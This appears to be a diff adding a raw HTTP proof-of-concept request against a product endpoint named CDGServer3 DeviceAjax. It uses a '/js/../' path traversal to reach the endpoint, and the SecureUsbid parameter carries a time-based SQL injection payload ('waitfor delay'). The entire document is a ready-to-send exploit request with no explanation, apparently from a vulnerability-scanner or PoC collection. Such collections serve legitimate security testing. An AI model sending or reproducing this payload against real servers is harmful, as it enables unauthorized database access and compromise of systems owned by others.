@@ -1,0 +1,7 @@
+POST /CDGServer3/js/../DeviceAjax HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+
+command=delSecureUsb&SecureUsbid=-1'waitfor delay '0:0:5'--
